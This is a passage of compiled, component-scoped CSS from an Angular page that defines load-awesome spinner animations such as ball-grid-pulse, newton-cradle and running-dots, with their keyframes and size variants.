      -webkit-animation-duration: .84s;
      animation-duration: .84s;
      -webkit-animation-delay: .07s;
      animation-delay: .07s
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      -webkit-animation-duration: .68s;
      animation-duration: .68s;
      -webkit-animation-delay: -.66s;
      animation-delay: -.66s
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      -webkit-animation-duration: .93s;
      animation-duration: .93s;
      -webkit-animation-delay: -.76s;
      animation-delay: -.76s
    }

    .la-ball-grid-beat[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(9) {
      -webkit-animation-duration: 1.24s;
      animation-duration: 1.24s;
      -webkit-animation-delay: -.76s;
      animation-delay: -.76s
    }

    .la-ball-grid-beat.la-sm[_ngcontent-oeb-c134] {
      width: 18px;
      height: 18px
    }

    .la-ball-grid-beat.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin: 1px
    }

    .la-ball-grid-beat.la-2x[_ngcontent-oeb-c134] {
      width: 72px;
      height: 72px
    }

    .la-ball-grid-beat.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px;
      margin: 4px
    }

    .la-ball-grid-beat.la-3x[_ngcontent-oeb-c134] {
      width: 108px;
      height: 108px
    }

    .la-ball-grid-beat.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px;
      margin: 6px
    }

    @-webkit-keyframes ball-grid-beat {
      0% {
        opacity: 1
      }

      50% {
        opacity: .35
      }

      to {
        opacity: 1
      }
    }

    @keyframes ball-grid-beat {
      0% {
        opacity: 1
      }

      50% {
        opacity: .35
      }

      to {
        opacity: 1
      }
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134],
    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-grid-pulse.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134] {
      width: 36px;
      height: 36px
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 8px;
      height: 8px;
      margin: 2px;
      border-radius: 100%;
      -webkit-animation-name: ball-grid-pulse;
      animation-name: ball-grid-pulse;
      -webkit-animation-iteration-count: infinite;
      animation-iteration-count: infinite
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-duration: .65s;
      animation-duration: .65s;
      -webkit-animation-delay: .03s;
      animation-delay: .03s
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-duration: 1.02s;
      animation-duration: 1.02s;
      -webkit-animation-delay: .09s;
      animation-delay: .09s
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-duration: 1.06s;
      animation-duration: 1.06s;
      -webkit-animation-delay: -.69s;
      animation-delay: -.69s
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      -webkit-animation-duration: 1.5s;
      animation-duration: 1.5s;
      -webkit-animation-delay: -.41s;
      animation-delay: -.41s
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      -webkit-animation-duration: 1.6s;
      animation-duration: 1.6s;
      -webkit-animation-delay: .04s;
      animation-delay: .04s
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      -webkit-animation-duration: .84s;
      animation-duration: .84s;
      -webkit-animation-delay: .07s;
      animation-delay: .07s
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      -webkit-animation-duration: .68s;
      animation-duration: .68s;
      -webkit-animation-delay: -.66s;
      animation-delay: -.66s
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      -webkit-animation-duration: .93s;
      animation-duration: .93s;
      -webkit-animation-delay: -.76s;
      animation-delay: -.76s
    }

    .la-ball-grid-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(9) {
      -webkit-animation-duration: 1.24s;
      animation-duration: 1.24s;
      -webkit-animation-delay: -.76s;
      animation-delay: -.76s
    }

    .la-ball-grid-pulse.la-sm[_ngcontent-oeb-c134] {
      width: 18px;
      height: 18px
    }

    .la-ball-grid-pulse.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin: 1px
    }

    .la-ball-grid-pulse.la-2x[_ngcontent-oeb-c134] {
      width: 72px;
      height: 72px
    }

    .la-ball-grid-pulse.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px;
      margin: 4px
    }

    .la-ball-grid-pulse.la-3x[_ngcontent-oeb-c134] {
      width: 108px;
      height: 108px
    }

    .la-ball-grid-pulse.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px;
      margin: 6px
    }

    @-webkit-keyframes ball-grid-pulse {
      0% {
        opacity: 1;
        transform: scale(1)
      }

      50% {
        opacity: .35;
        transform: scale(.45)
      }

      to {
        opacity: 1;
        transform: scale(1)
      }
    }

    @keyframes ball-grid-pulse {
      0% {
        opacity: 1;
        transform: scale(1)
      }

      50% {
        opacity: .35;
        transform: scale(.45)
      }

      to {
        opacity: 1;
        transform: scale(1)
      }
    }

    .la-ball-newton-cradle[_ngcontent-oeb-c134],
    .la-ball-newton-cradle[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-newton-cradle[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-newton-cradle.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-newton-cradle[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-newton-cradle[_ngcontent-oeb-c134] {
      width: 40px;
      height: 10px
    }

    .la-ball-newton-cradle[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 10px;
      height: 10px;
      border-radius: 100%
    }

    .la-ball-newton-cradle[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      transform: translateX(0);
      -webkit-animation: ball-newton-cradle-left 1s ease-out 0s infinite;
      animation: ball-newton-cradle-left 1s ease-out 0s infinite
    }

    .la-ball-newton-cradle[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      transform: translateX(0);
      -webkit-animation: ball-newton-cradle-right 1s ease-out 0s infinite;
      animation: ball-newton-cradle-right 1s ease-out 0s infinite
    }

    .la-ball-newton-cradle.la-sm[_ngcontent-oeb-c134] {
      width: 20px;
      height: 4px
    }

    .la-ball-newton-cradle.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px
    }

    .la-ball-newton-cradle.la-2x[_ngcontent-oeb-c134] {
      width: 80px;
      height: 20px
    }

    .la-ball-newton-cradle.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px
    }

    .la-ball-newton-cradle.la-3x[_ngcontent-oeb-c134] {
      width: 120px;
      height: 30px
    }

    .la-ball-newton-cradle.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px
    }

    @-webkit-keyframes ball-newton-cradle-left {
      25% {
        transform: translateX(-100%);
        -webkit-animation-timing-function: ease-in;
        animation-timing-function: ease-in
      }

      50% {
        transform: translateX(0)
      }
    }

    @keyframes ball-newton-cradle-left {
      25% {
        transform: translateX(-100%);
        -webkit-animation-timing-function: ease-in;
        animation-timing-function: ease-in
      }

      50% {
        transform: translateX(0)
      }
    }

    @-webkit-keyframes ball-newton-cradle-right {
      50% {
        transform: translateX(0)
      }

      75% {
        transform: translateX(100%);
        -webkit-animation-timing-function: ease-in;
        animation-timing-function: ease-in
      }

      to {
        transform: translateX(0)
      }
    }

    @keyframes ball-newton-cradle-right {
      50% {
        transform: translateX(0)
      }

      75% {
        transform: translateX(100%);
        -webkit-animation-timing-function: ease-in;
        animation-timing-function: ease-in
      }

      to {
        transform: translateX(0)
      }
    }

    .la-ball-pulse-rise[_ngcontent-oeb-c134],
    .la-ball-pulse-rise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-pulse-rise[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-pulse-rise.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-pulse-rise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-pulse-rise[_ngcontent-oeb-c134] {
      width: 70px;
      height: 14px
    }

    .la-ball-pulse-rise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 10px;
      height: 10px;
      margin: 2px;
      border-radius: 100%;
      -webkit-animation: ball-pulse-rise-even 1s cubic-bezier(.15, .36, .9, .6) 0s infinite;
      animation: ball-pulse-rise-even 1s cubic-bezier(.15, .36, .9, .6) 0s infinite
    }

    .la-ball-pulse-rise[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2n-1) {
      -webkit-animation-name: ball-pulse-rise-odd;
      animation-name: ball-pulse-rise-odd
    }

    .la-ball-pulse-rise.la-sm[_ngcontent-oeb-c134] {
      width: 34px;
      height: 6px
    }

    .la-ball-pulse-rise.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin: 1px
    }

    .la-ball-pulse-rise.la-2x[_ngcontent-oeb-c134] {
      width: 140px;
      height: 28px
    }

    .la-ball-pulse-rise.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px;
      margin: 4px
    }

    .la-ball-pulse-rise.la-3x[_ngcontent-oeb-c134] {
      width: 210px;
      height: 42px
    }

    .la-ball-pulse-rise.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px;
      margin: 6px
    }

    @-webkit-keyframes ball-pulse-rise-even {
      0% {
        opacity: 1;
        transform: scale(1.1)
      }

      25% {
        transform: translateY(-200%)
      }

      50% {
        opacity: .35;
        transform: scale(.3)
      }

      75% {
        transform: translateY(200%)
      }

      to {
        opacity: 1;
        transform: translateY(0);
        transform: scale(1)
      }
    }

    @keyframes ball-pulse-rise-even {
      0% {
        opacity: 1;
        transform: scale(1.1)
      }

      25% {
        transform: translateY(-200%)
      }

      50% {
        opacity: .35;
        transform: scale(.3)
      }

      75% {
        transform: translateY(200%)
      }

      to {
        opacity: 1;
        transform: translateY(0);
        transform: scale(1)
      }
    }

    @-webkit-keyframes ball-pulse-rise-odd {
      0% {
        opacity: .35;
        transform: scale(.4)
      }

      25% {
        transform: translateY(200%)
      }

      50% {
        opacity: 1;
        transform: scale(1.1)
      }

      75% {
        transform: translateY(-200%)
      }

      to {
        opacity: .35;
        transform: translateY(0);
        transform: scale(.75)
      }
    }

    @keyframes ball-pulse-rise-odd {
      0% {
        opacity: .35;
        transform: scale(.4)
      }

      25% {
        transform: translateY(200%)
      }

      50% {
        opacity: 1;
        transform: scale(1.1)
      }

      75% {
        transform: translateY(-200%)
      }

      to {
        opacity: .35;
        transform: translateY(0);
        transform: scale(.75)
      }
    }

    .la-ball-pulse-sync[_ngcontent-oeb-c134],
    .la-ball-pulse-sync[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-pulse-sync[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-pulse-sync.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-pulse-sync[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-pulse-sync[_ngcontent-oeb-c134] {
      width: 54px;
      height: 18px
    }

    .la-ball-pulse-sync[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 10px;
      height: 10px;
      margin: 4px;
      border-radius: 100%;
      -webkit-animation: ball-pulse-sync .6s ease-in-out infinite;
      animation: ball-pulse-sync .6s ease-in-out infinite
    }

    .la-ball-pulse-sync[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-delay: -.14s;
      animation-delay: -.14s
    }

    .la-ball-pulse-sync[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-delay: -.07s;
      animation-delay: -.07s
    }

    .la-ball-pulse-sync[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: 0s;
      animation-delay: 0s
    }

    .la-ball-pulse-sync.la-sm[_ngcontent-oeb-c134] {
      width: 26px;
      height: 8px
    }

    .la-ball-pulse-sync.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin: 2px
    }

    .la-ball-pulse-sync.la-2x[_ngcontent-oeb-c134] {
      width: 108px;
      height: 36px
    }

    .la-ball-pulse-sync.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px;
      margin: 8px
    }

    .la-ball-pulse-sync.la-3x[_ngcontent-oeb-c134] {
      width: 162px;
      height: 54px
    }

    .la-ball-pulse-sync.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px;
      margin: 12px
    }

    @-webkit-keyframes ball-pulse-sync {
      33% {
        transform: translateY(100%)
      }

      66% {
        transform: translateY(-100%)
      }

      to {
        transform: translateY(0)
      }
    }

    @keyframes ball-pulse-sync {
      33% {
        transform: translateY(100%)
      }

      66% {
        transform: translateY(-100%)
      }

      to {
        transform: translateY(0)
      }
    }

    .la-ball-pulse[_ngcontent-oeb-c134],
    .la-ball-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-pulse[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-pulse.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-pulse[_ngcontent-oeb-c134] {
      width: 54px;
      height: 18px
    }

    .la-ball-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-delay: -.2s;
      animation-delay: -.2s
    }

    .la-ball-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-delay: -.1s;
      animation-delay: -.1s
    }

    .la-ball-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: 0ms;
      animation-delay: 0ms
    }

    .la-ball-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 10px;
      height: 10px;
      margin: 4px;
      border-radius: 100%;
      -webkit-animation: ball-pulse 1s ease infinite;
      animation: ball-pulse 1s ease infinite
    }

    .la-ball-pulse.la-sm[_ngcontent-oeb-c134] {
      width: 26px;
      height: 8px
    }

    .la-ball-pulse.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin: 2px
    }

    .la-ball-pulse.la-2x[_ngcontent-oeb-c134] {
      width: 108px;
      height: 36px
    }

    .la-ball-pulse.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px;
      margin: 8px
    }

    .la-ball-pulse.la-3x[_ngcontent-oeb-c134] {
      width: 162px;
      height: 54px
    }

    .la-ball-pulse.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px;
      margin: 12px
    }

    @-webkit-keyframes ball-pulse {

      0%,
      60%,
      to {
        opacity: 1;
        transform: scale(1)
      }

      30% {
        opacity: .1;
        transform: scale(.01)
      }
    }

    @keyframes ball-pulse {

      0%,
      60%,
      to {
        opacity: 1;
        transform: scale(1)
      }

      30% {
        opacity: .1;
        transform: scale(.01)
      }
    }

    .la-ball-rotate[_ngcontent-oeb-c134],
    .la-ball-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-rotate[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-rotate.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-rotate[_ngcontent-oeb-c134],
    .la-ball-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 10px;
      height: 10px
    }

    .la-ball-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      border-radius: 100%;
      -webkit-animation: ball-rotate-animation 1s cubic-bezier(.7, -.13, .22, .86) infinite;
      animation: ball-rotate-animation 1s cubic-bezier(.7, -.13, .22, .86) infinite
    }

    .la-ball-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after,
    .la-ball-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:before {
      position: absolute;
      width: inherit;
      height: inherit;
      margin: inherit;
      content: "";
      background: currentColor;
      border-radius: inherit;
      opacity: .8
    }

    .la-ball-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:before {
      top: 0;
      left: -150%
    }

    .la-ball-rotate[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after {
      top: 0;
      left: 150%
    }

    .la-ball-rotate.la-sm[_ngcontent-oeb-c134],
    .la-ball-rotate.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px
    }

    .la-ball-rotate.la-2x[_ngcontent-oeb-c134],
    .la-ball-rotate.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px
    }

    .la-ball-rotate.la-3x[_ngcontent-oeb-c134],
    .la-ball-rotate.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px
    }

    @-webkit-keyframes ball-rotate-animation {
      0% {
        transform: rotate(0deg)
      }

      50% {
        transform: rotate(180deg)
      }

      to {
        transform: rotate(1turn)
      }
    }

    @keyframes ball-rotate-animation {
      0% {
        transform: rotate(0deg)
      }

      50% {
        transform: rotate(180deg)
      }

      to {
        transform: rotate(1turn)
      }
    }

    .la-ball-running-dots[_ngcontent-oeb-c134],
    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-running-dots[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-running-dots.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-running-dots[_ngcontent-oeb-c134] {
      width: 10px;
      height: 10px
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      width: 10px;
      height: 10px;
      margin-left: -25px;
      border-radius: 100%;
      -webkit-animation: ball-running-dots-animate 2s linear infinite;
      animation: ball-running-dots-animate 2s linear infinite
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-delay: 0s;
      animation-delay: 0s
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-delay: -.4s;
      animation-delay: -.4s
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: -.8s;
      animation-delay: -.8s
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      -webkit-animation-delay: -1.2s;
      animation-delay: -1.2s
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      -webkit-animation-delay: -1.6s;
      animation-delay: -1.6s
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      -webkit-animation-delay: -2s;
      animation-delay: -2s
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      -webkit-animation-delay: -2.4s;
      animation-delay: -2.4s
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      -webkit-animation-delay: -2.8s;
      animation-delay: -2.8s
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(9) {
      -webkit-animation-delay: -3.2s;
      animation-delay: -3.2s
    }

    .la-ball-running-dots[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(10) {
      -webkit-animation-delay: -3.6s;
      animation-delay: -3.6s
    }

    .la-ball-running-dots.la-sm[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px
    }

    .la-ball-running-dots.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin-left: -12px
    }

    .la-ball-running-dots.la-2x[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px
    }

    .la-ball-running-dots.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px;
      margin-left: -50px
    }

    .la-ball-running-dots.la-3x[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px
    }

    .la-ball-running-dots.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px;
      margin-left: -75px
    }

    @-webkit-keyframes ball-running-dots-animate {

      0%,
      to {
        width: 100%;
        height: 100%;
        transform: translateY(0) translateX(500%)
      }

      80% {
        transform: translateY(0) translateX(0)
      }

      85% {
        width: 100%;
        height: 100%;
        transform: translateY(-125%) translateX(0)
      }

      90% {
        width: 200%;
        height: 75%
      }

      95% {
        width: 100%;
        height: 100%;
        transform: translateY(-100%) translateX(500%)
      }
    }

    @keyframes ball-running-dots-animate {

      0%,
      to {
        width: 100%;
        height: 100%;
        transform: translateY(0) translateX(500%)
      }

      80% {
        transform: translateY(0) translateX(0)
      }

      85% {
        width: 100%;
        height: 100%;
        transform: translateY(-125%) translateX(0)
      }

      90% {
        width: 200%;
        height: 75%
      }

      95% {
        width: 100%;
        height: 100%;
        transform: translateY(-100%) translateX(500%)
      }
    }

    .la-ball-scale-multiple[_ngcontent-oeb-c134],
    .la-ball-scale-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-scale-multiple[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-scale-multiple.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-scale-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-scale-multiple[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-scale-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 0;
      left: 0;
      width: 32px;
      height: 32px;
      border-radius: 100%;
      opacity: 0;
      -webkit-animation: ball-scale-multiple 1s linear 0s infinite;
      animation: ball-scale-multiple 1s linear 0s infinite
    }

    .la-ball-scale-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-delay: .2s;
      animation-delay: .2s
    }

    .la-ball-scale-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: .4s;
      animation-delay: .4s
    }

    .la-ball-scale-multiple.la-sm[_ngcontent-oeb-c134],
    .la-ball-scale-multiple.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-scale-multiple.la-2x[_ngcontent-oeb-c134],
    .la-ball-scale-multiple.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-scale-multiple.la-3x[_ngcontent-oeb-c134],
    .la-ball-scale-multiple.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    @-webkit-keyframes ball-scale-multiple {
      0% {
        opacity: 0;
        transform: scale(0)
      }

      5% {
        opacity: .75
      }

      to {
        opacity: 0;
        transform: scale(1)
      }
    }

    @keyframes ball-scale-multiple {
      0% {
        opacity: 0;
        transform: scale(0)
      }

      5% {
        opacity: .75
      }

      to {
        opacity: 0;
        transform: scale(1)
      }
    }

    .la-ball-scale-pulse[_ngcontent-oeb-c134],
    .la-ball-scale-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-scale-pulse[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-scale-pulse.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-scale-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-scale-pulse[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-scale-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 0;
      left: 0;
      width: 32px;
      height: 32px;
      border-radius: 100%;
      opacity: .5;
      -webkit-animation: ball-scale-pulse 2s ease-in-out infinite;
      animation: ball-scale-pulse 2s ease-in-out infinite
    }

    .la-ball-scale-pulse[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      -webkit-animation-delay: -1s;
      animation-delay: -1s
    }

    .la-ball-scale-pulse.la-sm[_ngcontent-oeb-c134],
    .la-ball-scale-pulse.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-scale-pulse.la-2x[_ngcontent-oeb-c134],
    .la-ball-scale-pulse.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-scale-pulse.la-3x[_ngcontent-oeb-c134],
    .la-ball-scale-pulse.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    @-webkit-keyframes ball-scale-pulse {

      0%,
      to {
        transform: scale(0)
      }

      50% {
        transform: scale(1)
      }
    }

    @keyframes ball-scale-pulse {

      0%,
      to {
        transform: scale(0)
      }

      50% {
        transform: scale(1)
      }
    }

    .la-ball-scale-ripple-multiple[_ngcontent-oeb-c134],
    .la-ball-scale-ripple-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-scale-ripple-multiple[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-scale-ripple-multiple.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-scale-ripple-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-scale-ripple-multiple[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-scale-ripple-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 0;
      left: 0;
      width: 32px;
      height: 32px;
      background: transparent;
      border-width: 2px;
      border-radius: 100%;
      opacity: 0;
      -webkit-animation: ball-scale-ripple-multiple 1.25s cubic-bezier(.21, .53, .56, .8) 0s infinite;
      animation: ball-scale-ripple-multiple 1.25s cubic-bezier(.21, .53, .56, .8) 0s infinite
    }

    .la-ball-scale-ripple-multiple[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-delay: 0s;
      animation-delay: 0s
    }

